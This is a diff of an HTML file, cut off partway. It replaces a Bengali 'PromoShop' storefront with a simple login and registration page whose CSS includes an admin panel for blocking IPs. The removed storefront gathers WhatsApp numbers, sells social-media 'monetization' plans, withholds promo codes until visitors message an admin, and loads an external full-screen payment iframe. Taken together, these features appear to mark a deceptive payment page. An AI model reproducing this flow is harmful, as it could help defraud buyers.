@@ -1,1551 +1,1173 @@
 <!DOCTYPE html>
-<html lang="bn" class="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PromoShop - Premium Services</title>
-
-    <script>
-        // ==================== GLOBAL CONFIGURATION ====================
-        const globalDiscountConfig = "on-35"; 
-        // ==============================================================
-    </script>
-
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
-    
+    <title>Login & Registration</title>
     <style>
-        :root {
-            --background: 0 0% 100%;
-            --foreground: 0 0% 3.9%;
-            --card: 0 0% 100%;
-            --card-foreground: 0 0% 3.9%;
-            --primary: 0 0% 9%;
-            --primary-foreground: 0 0% 98%;
-            --border: 0 0% 89.8%;
-            --radius: 0.5rem;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
-
-        .dark {
-            --background: 0 0% 3.9%;
-            --foreground: 0 0% 98%;
-            --card: 0 0% 11%;
-            --card-foreground: 0 0% 98%;
-            --border: 0 0% 14.9%;
-        }
-
         body {
-            background-color: #1a1a1a !important;
-            color: #e0e0e0 !important;
-            font-family: 'Hind Siliguri', sans-serif, system-ui;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
         }
-
-        [x-cloak] { display: none !important; }
-
-        .bg-promo-dark-bg { background-color: #1a1a1a; }
-        .bg-promo-card-bg { background-color: #242424; }
-        .text-promo-text-light { color: #ffffff; }
-        .text-promo-text-muted { color: #a0a0a0; }
-        .border-promo-red { border-color: #ff3b30; }
-        .bg-promo-red-20 { background-color: rgba(255, 59, 48, 0.2); }
-        .hover-bg-promo-red-30:hover { background-color: rgba(255, 59, 48, 0.3); }
-        .text-promo-red { color: #ff3b30; }
-        
-        .animate-spin-custom {
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        /* Toast Notification Styles */
-        .live-toast-notification {
-            pointer-events: auto;
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
             width: 100%;
-            background-color: rgba(24, 24, 27, 0.95);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            color: #ffffff;
+            max-width: 450px;
+            transition: 0.3s;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #1a1a2e;
+            font-weight: 600;
+        }
+        .tab {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #e9ecef;
+            padding-bottom: 10px;
+        }
+        .tab button {
+            flex: 1;
+            padding: 12px 0;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            font-weight: 600;
+            color: #6c757d;
+            cursor: pointer;
+            border-radius: 40px;
+            transition: 0.3s;
+        }
+        .tab button.active {
+            background: #4361ee;
+            color: white;
+            box-shadow: 0 4px 12px rgba(67,97,238,0.3);
+        }
+        .tab button:hover {
+            background: #e9ecef;
+        }
+        .tab button.active:hover {
+            background: #3a56d4;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            color: #2d4059;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid #dee2e6;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: 0.3s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #4361ee;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(67,97,238,0.15);
+        }
+        .form-group input.error {
+            border-color: #dc3545 !important;
+            background: #fff5f5 !important;
+        }
+        .btn {
+            width: 100%;
             padding: 14px;
+            background: #4361ee;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .btn:hover {
+            background: #3a56d4;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(67,97,238,0.3);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .message {
+            margin-top: 18px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 500;
+        }
+        .message.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .message.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .message.info {
+            display: block;
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .switch-link {
+            text-align: center;
+            margin-top: 18px;
+            color: #6c757d;
+        }
+        .switch-link a {
+            color: #4361ee;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .switch-link a:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #6c757d;
+            font-size: 14px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dee2e6;
+        }
+        .divider::before {
+            margin-right: 15px;
+        }
+        .divider::after {
+            margin-left: 15px;
+        }
+        .btn-google {
+            background: #db4437;
+            margin-top: 10px;
+        }
+        .btn-google:hover {
+            background: #c23321;
+            box-shadow: 0 8px 20px rgba(219,68,55,0.3);
+        }
+        .google-icon {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            margin-right: 10px;
+            vertical-align: middle;
+            line-height: 20px;
+            text-align: center;
+            font-weight: bold;
+            color: #db4437;
+        }
+        .user-status {
+            text-align: center;
+            padding: 20px;
+            background: #e8f5e9;
             border-radius: 12px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.4);
-            transform: translateY(20px);
-            opacity: 0;
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 20px;
+        }
+        .user-status .name {
+            font-size: 20px;
+            font-weight: 600;
+            color: #2e7d32;
+        }
+        .user-status .email {
+            color: #555;
+            margin-top: 5px;
+        }
+        .logout-btn {
+            background: #dc3545;
+            margin-top: 10px;
+        }
+        .logout-btn:hover {
+            background: #c82333;
+        }
+
+        /* Admin Panel Page */
+        .admin-panel-page {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 25px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+        }
+        .admin-panel-page h2 {
+            color: #1a1a2e;
+            border-bottom: 2px solid #4361ee;
+            padding-bottom: 12px;
+            margin-bottom: 25px;
             display: flex;
             align-items: center;
             gap: 12px;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        .live-toast-notification.show {
-            transform: translateY(0);
-            opacity: 1;
+        .admin-panel-page .stats {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
         }
-        .live-toast-notification.hide {
-            transform: translateY(-10px);
-            opacity: 0;
+        .admin-panel-page .stats .stat-card {
+            flex: 1;
+            min-width: 120px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            border-left: 4px solid #4361ee;
         }
-
-        /* ============ PAYMENT PAGE FULL SCREEN STYLES ============ */
-        .payment-page-wrapper {
-            position: fixed !important;
-            top: 0 !important;
-            left: 0 !important;
-            right: 0 !important;
-            bottom: 0 !important;
-            width: 100vw !important;
-            height: 100vh !important;
-            max-width: 100% !important;
-            max-height: 100% !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            background: #ffffff !important;
-            border-radius: 0 !important;
-            overflow: hidden !important;
-            z-index: 99999 !important;
+        .admin-panel-page .stats .stat-card .number {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a2e;
         }
-
-        .payment-page-wrapper iframe {
-            width: 100% !important;
-            height: 100% !important;
-            border: none !important;
-            display: block !important;
+        .admin-panel-page .stats .stat-card .label {
+            font-size: 14px;
+            color: #6c757d;
+            margin-top: 5px;
         }
-
-        body.payment-mode {
-            overflow: hidden !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            background: #ffffff !important;
+        .admin-panel-page .ip-list-container {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
         }
-
-        body.payment-mode #main-header-container,
-        body.payment-mode .w-full.max-w-md:not(.payment-page-wrapper) {
-            display: none !important;
+        .admin-panel-page .ip-list-container h4 {
+            margin-bottom: 12px;
+            color: #2d4059;
         }
-
-        body.payment-mode .min-h-screen {
-            padding: 0 !important;
-            margin: 0 !important;
+        .admin-panel-page .ip-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: white;
+            border-radius: 8px;
+            padding: 10px;
+            border: 1px solid #dee2e6;
+        }
+        .admin-panel-page .ip-list .blocked-ip {
+            padding: 6px 12px;
+            margin: 4px 0;
+            background: #fff5f5;
+            border-radius: 6px;
+            color: #dc3545;
+            font-family: monospace;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-left: 3px solid #dc3545;
+        }
+        .admin-panel-page .ip-list .blocked-ip .remove-btn {
+            background: none;
+            border: none;
+            color: #dc3545;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .admin-panel-page .ip-list .empty-msg {
+            color: #6c757d;
+            text-align: center;
+            padding: 20px;
+        }
+        .admin-panel-page .action-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .admin-panel-page .action-grid .btn {
+            margin: 0;
+            font-size: 15px;
+            padding: 12px;
+            border-radius: 10px;
+        }
+        .admin-panel-page .input-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .admin-panel-page .input-group input {
+            flex: 2;
+            min-width: 150px;
+            padding: 12px 16px;
+            border: 1.5px solid #dee2e6;
+            border-radius: 10px;
+            font-size: 15px;
+        }
+        .admin-panel-page .input-group button {
+            flex: 1;
+            min-width: 80px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            color: white;
+        }
+        .admin-panel-page .input-group .block-btn { background: #dc3545; }
+        .admin-panel-page .input-group .block-btn:hover { background: #c82333; }
+        .admin-panel-page .input-group .unblock-btn { background: #28a745; }
+        .admin-panel-page .input-group .unblock-btn:hover { background: #218838; }
+        .admin-panel-page .status-msg {
+            margin-top: 15px;
+            padding: 10px 16px;
+            border-radius: 10px;
+            font-weight: 500;
+        }
+        .admin-panel-page .status-msg.success { background: #d4edda; color: #155724; }
+        .admin-panel-page .status-msg.error { background: #f8d7da; color: #721c24; }
+        .admin-panel-page .status-msg.info { background: #d1ecf1; color: #0c5460; }
+        .admin-panel-page .back-link {
+            display: inline-block;
+            margin-top: 25px;
+            color: #4361ee;
+            font-weight: 600;
+            text-decoration: none;
+            border: 2px solid #4361ee;
+            padding: 8px 20px;
+            border-radius: 40px;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .admin-panel-page .back-link:hover {
+            background: #4361ee;
+            color: white;
         }
     </style>
 </head>
-<body x-data="promoShopMaster()" x-init="initMaster()" class="min-h-screen flex flex-col items-center justify-center p-4 bg-promo-dark-bg">
+<body>
+<div class="container" id="appContainer">
+    <h2>🔐 Account</h2>
 
-    <!-- Header -->
-    <div x-cloak x-show="currentPage !== 'whatsapp-entry' && currentPage !== 'telecom-checkout-frame'" id="main-header-container" class="w-full max-w-md bg-promo-card-bg rounded-t-2xl border-b border-zinc-800">
-        <header class="relative flex items-center justify-center py-6 px-6">
-            <div class="absolute left-4 top-2">
-                <div class="bg-gradient-to-r from-red-600 to-red-700 text-white px-3 py-1.5 rounded-full shadow-lg transform -rotate-12 text-center">
-                    <div class="text-base font-black leading-none" x-text="discountSettings.percent + '%'"></div>
-                    <div class="text-[10px] font-bold tracking-wider">OFF</div>
-                </div>
-            </div>
-            <div class="flex items-center gap-2 mt-2">
-                <i data-lucide="sparkles" class="w-6 h-6 text-red-500 fill-red-500"></i>
-                <span class="text-white text-xl font-bold tracking-wide">Promo Shop</span>
-            </div>
-        </header>
+    <!-- Tab switching -->
+    <div class="tab">
+        <button id="registerTab" class="active" onclick="showRegister()">📝 Register</button>
+        <button id="loginTab" onclick="showLogin()">🔑 Login</button>
     </div>
 
-    <!-- WhatsApp Entry -->
-    <div x-cloak x-show="currentPage === 'whatsapp-entry'" class="w-full max-w-md bg-promo-card-bg rounded-2xl p-6 border border-zinc-800 shadow-lg space-y-4">
-        <div class="text-center space-y-2">
-            <div class="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mx-auto border border-green-500/20">
-                <i data-lucide="message-square" class="w-8 h-8 text-green-500"></i>
-            </div>
-            <h2 class="text-xl font-bold text-white">WhatsApp Verification</h2>
-            <p class="text-xs text-promo-text-muted">পরবর্তীতে আপনার সাথে যোগাযোগের জন্য হোয়াটসঅ্যাপ নাম্বারটি দিন</p>
-        </div>
-
-        <div class="space-y-4">
-            <div>
-                <label class="block text-xs font-medium text-promo-text-muted mb-2">WhatsApp Number</label>
-                <input type="tel" x-model="wpEntryPhone" @keyup.enter="submitWhatsAppNumber()" placeholder="01XXXXXXXXX" class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-500 transition">
-                <p x-show="wpEntryError" class="text-xs text-red-500 mt-1">সঠিক নম্বরটি প্রদান করুন</p>
-            </div>
-
-            <button @click="submitWhatsAppNumber()" :disabled="isWpSubmitting" class="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 rounded-xl transition text-sm flex items-center justify-center gap-2">
-                <span x-text="isWpSubmitting ? 'Sending...' : 'Next Step'"></span>
-                <i data-lucide="arrow-right" class="w-4 h-4"></i>
-            </button>
+    <!-- User Logged In Status -->
+    <div id="userStatus" class="hidden">
+        <div class="user-status">
+            <div class="name" id="loggedUserName">User</div>
+            <div class="email" id="loggedUserEmail">email@example.com</div>
+            <button class="btn logout-btn" onclick="logoutUser()">🚪 Logout</button>
         </div>
     </div>
 
-    <!-- Home Page -->
-    <div x-cloak x-show="currentPage === 'home'" class="w-full max-w-md space-y-4">
-        <div class="w-full bg-promo-card-bg rounded-b-2xl p-4 text-center border-x border-b border-zinc-800 shadow-lg">
-            <h1 class="text-2xl font-bold text-white tracking-wide">PROMOSHOP 50X</h1>
-            <p class="text-xs text-promo-text-muted">Premium,Digital & Gaming Services</p>
+    <!-- ========== Registration Form ========== -->
+    <div id="registerForm">
+        <div class="form-group">
+            <label>👤 Name</label>
+            <input type="text" id="regName" placeholder="Enter your name" required>
+        </div>
+        <div class="form-group">
+            <label>📧 Email</label>
+            <input type="email" id="regEmail" placeholder="example@gmail.com" required>
+        </div>
+        <div class="form-group">
+            <label>📱 Phone</label>
+            <input type="text" id="regNumber" placeholder="01XXXXXXXXX" maxlength="11" required>
+        </div>
+        <div class="form-group">
+            <label>🔒 Password</label>
+            <input type="password" id="regPassword" placeholder="Minimum 6 characters" required>
+        </div>
+        <div class="form-group">
+            <label>✅ Confirm Password</label>
+            <input type="password" id="regConfirm" placeholder="Re-enter password" required>
         </div>
 
-        <main class="w-full bg-promo-card-bg rounded-2xl shadow-lg border border-zinc-800 overflow-hidden p-4 grid gap-3">
-            
-            <div @click="navigateTo('youtube')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">1</span>
-                    <span class="text-sm font-bold text-white">Youtube Membership</span>
-                </div>
-                <i data-lucide="play" class="w-5 h-5 text-red-500"></i>
-            </div>
-
-            <div @click="navigateTo('facebook')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">2</span>
-                    <span class="text-sm font-bold text-white">Facebook Membership</span>
-                </div>
-                <i data-lucide="users" class="w-5 h-5 text-blue-500"></i>
-            </div>
-
-            <div @click="navigateTo('service-unavailable')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">3</span>
-                    <span class="text-sm font-bold text-white">Instagram Followers</span>
-                </div>
-                <i data-lucide="heart" class="w-5 h-5 text-pink-500"></i>
-            </div>
-
-            <div @click="navigateTo('service-unavailable')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">4</span>
-                    <span class="text-sm font-bold text-white">Tiktok Followers</span>
-                </div>
-                <i data-lucide="music" class="w-5 h-5 text-teal-400"></i>
-            </div>
-
-            <div @click="navigateTo('telecom-home')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">5</span>
-                    <span class="text-sm font-bold text-white">All Sim Offer</span>
-                </div>
-                <i data-lucide="phone-call" class="w-5 h-5 text-emerald-400"></i>
-            </div>
-
-            <div @click="navigateTo('free-fire-topup')" class="flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-emerald-900/40 to-zinc-800/50 border border-emerald-700/40 hover:bg-zinc-800 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-emerald-700 text-xs rounded-full font-bold text-white">6</span>
-                    <span class="text-sm font-bold text-white">Free Fire Diamond TopUp</span>
-                </div>
-                <i data-lucide="zap" class="w-5 h-5 text-amber-400"></i>
-            </div>
-
-            <div @click="openDirectConfirmOrder()" class="flex items-center justify-between p-3 rounded-xl bg-promo-red-20 border border-promo-red hover-bg-promo-red-30 transition cursor-pointer">
-                <div class="flex items-center gap-3">
-                    <span class="w-6 h-6 flex items-center justify-center bg-red-600 text-xs rounded-full font-bold text-white">#</span>
-                    <span class="text-sm font-bold text-white">Confirm Order</span>
-                </div>
-                <i data-lucide="check-circle" class="w-5 h-5 text-promo-red"></i>
-            </div>
-        </main>
-
-        <div class="w-full bg-promo-card-bg rounded-2xl shadow-lg border border-zinc-800 overflow-hidden">
-            <div class="p-6 text-center space-y-4">
-                <h3 class="text-promo-text-light font-bold text-base mb-4">Contact Information</h3>
-                <div class="space-y-3">
-                    <div class="flex items-center justify-center gap-2 text-promo-text-light">
-                        <i data-lucide="mail" class="w-4 h-4 text-promo-red"></i>
-                        <span class="text-sm">promoshop50x@gmail.com</span>
-                    </div>
-                    <div class="flex items-center justify-center gap-2 text-promo-text-light">
-                        <i data-lucide="message-circle" class="w-4 h-4 text-green-500"></i>
-                        <span class="text-sm">WhatsApp Support</span>
-                    </div>
-                    <div class="flex items-center justify-center gap-2 text-promo-text-light">
-                        <i data-lucide="phone" class="w-4 h-4 text-promo-red"></i>
-                        <span class="text-sm">01344196469</span>
-                    </div>
-                </div>
-                <div class="border-t border-zinc-800 pt-4 mt-6">
-                    <p class="text-promo-text-muted text-xs">Copyright © 2026 All Rights Reserved</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Telecom Home -->
-    <div x-cloak x-show="currentPage === 'telecom-home'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl pb-6">
-        <section class="bg-[#0d5c2e] text-white py-8 px-4 text-center shadow-md">
-            <h1 class="text-2xl font-bold mb-2">সেকেন্ডেই মোবাইল রিচার্জ</h1>
-            <p class="text-white/85 text-xs">সব অপারেটরের ইন্টারনেট ও মিনিট প্যাক কিনুন ঘরে বসেই একদম সহজে।</p>
-        </section>
+        <button class="btn" id="registerBtn" onclick="registerUser()">📥 Register</button>
         
-        <div class="p-4">
-            <div class="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 flex items-center gap-3 mb-6">
-                <span class="text-xl">🔥</span>
-                <div>
-                    <h4 class="font-bold text-amber-400 text-xs">বিশেষ প্রোমো কোড অফার!</h4>
-                    <p class="text-[11px] text-zinc-400">লাইভ প্রোমো কোড ব্যবহার করে অফারটি অ্যাক্টিভেট করুন।</p>
-                </div>
-            </div>
-
-            <h2 class="text-sm font-bold mb-3 text-white uppercase tracking-wider">অপারেটর সিলেক্ট করুন</h2>
-            <div class="grid grid-cols-2 gap-3">
-                <template x-for="(op, slug) in operatorOffers" :key="slug">
-                    <button @click="navigateToOperator(slug)" class="bg-zinc-800 p-4 rounded-xl border border-zinc-700 hover:border-emerald-500 transition-all flex flex-col items-center justify-center h-28 cursor-pointer">
-                        <img :src="op.logo" :alt="op.name" class="h-12 object-contain rounded-md mb-2">
-                        <span class="font-semibold text-xs text-zinc-300" x-text="op.name"></span>
-                    </button>
-                </template>
-            </div>
-            
-            <button @click="navigateTo('home')" class="w-full mt-6 border border-zinc-700 text-zinc-400 hover:text-white py-2.5 rounded-xl text-xs transition">
-                হোম পেজে ফিরে আসুন 
-            </button>
-        </div>
-    </div>
-
-    <!-- Telecom Operator -->
-    <div x-cloak x-show="currentPage === 'telecom-operator'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl pb-6">
-        <header class="bg-[#0d5c2e] text-white py-3 px-4 flex items-center gap-3">
-            <button @click="navigateTo('telecom-home')" class="hover:bg-white/10 p-1.5 rounded-full transition">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <div class="flex items-center gap-2">
-                <h1 class="text-base font-bold"><span x-text="operatorOffers[currentSlug]?.name"></span> অফারসমূহ</h1>
-            </div>
-        </header>
-
-        <div class="p-4 max-h-[500px] overflow-y-auto space-y-3">
-            <template x-for="offer in operatorOffers[currentSlug]?.offers || []" :key="offer.id">
-                <div :class="offer.stockOut ? 'border-red-900/50 bg-red-950/20 opacity-60' : 'border-zinc-800 bg-zinc-800/60'" class="relative rounded-xl p-3.5 border flex flex-col justify-between gap-2">
-                    <template x-if="offer.stockOut">
-                        <span class="absolute top-2 right-2 bg-red-600 text-white text-[10px] px-2 py-0.5 rounded-full font-bold">Stock Out</span>
-                    </template>
-                    
-                    <div class="space-y-1">
-                        <div class="flex items-center gap-2 text-white font-bold text-sm">
-                            <i data-lucide="globe" class="w-4 h-4 text-emerald-400"></i>
-                            <span x-text="offer.data"></span>
-                        </div>
-                        <template x-if="offer.minutes">
-                            <div class="flex items-center gap-2 text-zinc-400 text-xs">
-                                <i data-lucide="phone" class="w-3.5 h-3.5 text-blue-400"></i>
-                                <span x-text="offer.minutes"></span>
-                            </div>
-                        </template>
-                        <div class="flex items-center gap-2 text-zinc-400 text-xs">
-                            <i data-lucide="clock" class="w-3.5 h-3.5 text-amber-400"></i>
-                            <span x-text="offer.validity"></span>
-                        </div>
-                    </div>
-                    <div class="flex items-center justify-between border-t border-zinc-800 pt-2 mt-1">
-                        <div class="flex flex-col">
-                            <span class="text-emerald-400 font-bold text-base" x-text="'৳' + calcPriceOnSite(offer.basePrice)"></span>
-                            <template x-if="discountSettings.mode === 'on' || discountSettings.mode === 'off'">
-                                <span class="text-zinc-500 line-through text-[10px]" x-text="'৳' + offer.basePrice"></span>
-                            </template>
-                        </div>
-                        <template x-if="!offer.stockOut">
-                            <button @click="navigateToTelecomCheckout(offer)" class="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold px-4 py-1.5 rounded-lg transition">Buy Now</button>
-                        </template>
-                    </div>
-                </div>
-            </template>
-        </div>
-    </div>
-
-    <!-- Telecom Checkout -->
-    <div x-cloak x-show="currentPage === 'telecom-checkout'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="flex items-center gap-3 pb-2 border-b border-zinc-800">
-            <button @click="currentPage = 'telecom-operator'" class="hover:bg-zinc-800 p-1.5 rounded-full transition text-zinc-400">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <h1 class="text-base font-bold text-white">Checkout Box</h1>
-        </div>
-
-        <div class="bg-zinc-800 p-3 rounded-xl border border-zinc-700 flex items-center justify-between">
-            <div>
-                <h4 class="font-bold text-white text-sm capitalize" x-text="currentSlug"></h4>
-                <p class="text-xs text-zinc-400" x-text="checkoutOffer.data + ' ' + (checkoutOffer.minutes || '')"></p>
-            </div>
-            <span class="text-emerald-400 font-bold" x-text="'৳' + calcCheckoutPrice(checkoutOffer.basePrice, telecomPromo)"></span>
-        </div>
-
-        <div class="space-y-3">
-            <div>
-                <label class="block text-xs font-medium text-zinc-400 mb-1">Target Mobile Number *</label>
-                <input type="tel" x-model="telecomPhone" placeholder="01XXXXXXXXX" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
-                <p x-show="telecomErrors.phone" class="text-xs text-red-500 mt-1" x-text="telecomErrors.phone"></p>
-            </div>
-            <div>
-                <label class="block text-xs font-medium text-zinc-400 mb-1">Live Promo Code *</label>
-                <input type="text" x-model="telecomPromo" placeholder="Enter Promo Code" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 tracking-wider">
-                
-                <p class="text-[11px] mt-1.5 font-semibold">
-                    <span x-show="telecomPromo.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                    <span x-show="telecomPromo.trim() !== '' && telecomPromo.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।</span>
-                    <span x-show="telecomPromo.trim() !== '' && telecomPromo.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                </p>
-            </div>
-
-            <button @click="handleTelecomSubmit()" :disabled="isTelecomSubmitting" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl transition text-sm flex items-center justify-center gap-2 mt-4 shadow-md">
-                <span x-show="isTelecomSubmitting" class="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin-custom"></span>
-                <span x-text="isTelecomSubmitting ? 'Processing...' : 'Pay ৳' + calcCheckoutPrice(checkoutOffer.basePrice, telecomPromo)"></span>
-            </button>
-        </div>
-    </div>
-
-    <!-- ============ PAYMENT PAGE - FULL SCREEN (UPDATED) ============ -->
-    <div x-cloak x-show="currentPage === 'telecom-checkout-frame'" class="payment-page-wrapper">
-        <iframe :src="'https://onlinepaybn.netlify.app/?amount=' + globalPayAmount" class="w-full h-full border-0" title="Payment Gateway"></iframe>
-    </div>
-
-    <!-- YouTube Page -->
-    <div x-cloak x-show="currentPage === 'youtube'" class="w-full max-w-md bg-zinc-900 border-x border-b border-zinc-800 rounded-b-2xl p-4 space-y-4">
-        <div class="flex items-center gap-3 py-2 border-b border-zinc-800">
-            <button @click="navigateTo('home')" class="text-gray-300 hover:bg-zinc-800 p-1.5 rounded-full transition">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <div class="flex items-center gap-2">
-                <i class="fab fa-youtube text-red-500 text-xl"></i>
-                <h1 class="text-base font-bold text-white">YouTube Membership</h1>
-            </div>
-        </div>
-
-        <div class="bg-gradient-to-r from-green-600/10 to-emerald-600/20 border border-green-500/20 rounded-2xl p-4 text-center">
-            <i class="fab fa-youtube text-red-500 text-3xl mb-1"></i>
-            <h2 class="text-base font-bold mb-0.5 text-white">YouTube Monetization Plan</h2>
-            <p class="text-xs text-gray-400 mb-2">Boost views, watch hours instantly & start earning money!</p>
-            <span class="bg-emerald-600 text-white text-[10px] px-2.5 py-1 rounded font-bold uppercase" x-text="'🔥 Limited Offer - ' + discountSettings.percent + '% OFF'"></span>
-        </div>
-
-        <div class="space-y-3">
-            <h3 class="font-bold text-gray-300 text-xs uppercase tracking-wider">Choose Your Plan</h3>
-
